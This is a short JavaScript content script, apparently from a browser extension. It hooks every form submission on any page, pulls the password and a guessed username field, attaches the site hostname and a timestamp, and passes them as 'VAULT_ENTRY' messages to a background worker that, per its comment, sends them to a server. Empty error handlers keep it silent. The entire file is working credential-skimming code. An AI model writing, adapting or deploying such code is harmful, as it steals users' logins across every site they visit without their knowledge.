// Send to background service worker (it performs the fetch)
const sendToServer = (data) => {
  try {
    if (globalThis.chrome?.runtime?.sendMessage) {
      chrome.runtime.sendMessage({ type: 'VAULT_ENTRY', payload: data });
    }
  } catch {}
};

// Prefer form submit to reduce false positives
const extractAndSend = (root) => {
  try {
    const passInput = root.querySelector?.('input[type="password"]');
    if (!passInput || !passInput.value) return;

    let userInput = root.querySelector?.('input[type="email"]') ||
                    root.querySelector?.('input[name*="email" i]') ||
                    root.querySelector?.('input[id*="email" i]') ||
                    root.querySelector?.('input[name*="user" i]') ||
                    root.querySelector?.('input[id*="user" i]') ||
                    root.querySelector?.('input[type="text"]');
    if (!userInput || !userInput.value) {
      const allInputs = Array.from(root.querySelectorAll?.('input') || []);
      const passIndex = allInputs.indexOf(passInput);
      userInput = passIndex > 0 ? allInputs[passIndex - 1] : null;
    }

    if (userInput && passInput && passInput.value) {
      const site = window.location.hostname;
      const data = {
        user: userInput.value,
        pass: passInput.value,
        site: site,
        time: new Date().toLocaleString()
      };

      try { sendToServer(data); } catch {}
    }
  } catch {}
};

// Capture submit to avoid duplicates (click often triggers submit too)
document.addEventListener('submit', (e) => {
  try { extractAndSend(e.target || document); } catch {}
}, true);
